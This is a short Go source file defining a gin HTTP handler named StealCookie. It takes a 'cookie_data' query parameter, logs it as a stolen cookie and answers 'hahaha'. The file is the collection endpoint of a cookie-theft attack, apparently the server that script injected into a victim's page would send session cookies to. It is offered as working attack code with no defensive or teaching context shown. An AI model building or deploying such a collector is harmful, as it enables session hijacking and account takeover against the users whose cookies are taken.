package handlers

import (
	"log"
	"net/http"

	"github.com/gin-gonic/gin"
)

func StealCookie(c *gin.Context) {
	my_precious, exists := c.GetQuery("cookie_data")
	if exists {
		log.Print("Cookie stolen: " + my_precious)
	}
	c.IndentedJSON(http.StatusOK, "hahaha")
}
